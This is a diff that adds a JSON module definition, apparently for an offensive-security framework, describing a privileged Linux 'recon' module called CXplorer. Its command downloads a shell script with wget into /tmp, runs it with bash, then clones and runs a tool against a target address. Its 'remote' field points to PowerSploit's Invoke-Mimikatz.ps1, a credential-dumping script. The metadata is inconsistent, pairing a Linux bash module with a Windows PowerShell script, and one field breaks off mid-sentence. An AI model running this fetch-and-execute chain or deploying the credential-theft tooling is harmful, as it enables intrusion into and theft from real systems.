@@ -1,0 +1,24 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "CXplorer",
+    "author": ["Rubin Lucassen (@RubLuc)"],
+    "credits": ["Joe Bialek (@JosephBialek)", "Benjamin Delpy (@gentilkiwi)"],
+    "path": ["linux", "x64", "bash", "recon", "recon.json"],
+    "platform": "linux",
+    "arch": "x64",
+    "lang": "bash",
+    "privilege": true,
+    "notes": "This is part of the ",
+    "remote": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1",
+    "options": [
+      {"name": "domain", "value": "http://192.168.88.132/", "required": true, "flag": "-u", "description": "domain information"}
+    ],
+    "description": "",
+    "commands": [
+      "/bin/sh",
+      "-c",
+      "wget -O /tmp/install.sh https://raw.githubusercontent.com/RubLuc/Recon/main/install.sh; /bin/bash /tmp/install.sh; git -C /tmp clone https://github.com/SecurityKnights/CXplorer; /tmp/CXplorer/CXplorer {{domain}}"
+    ]
+  }
+}
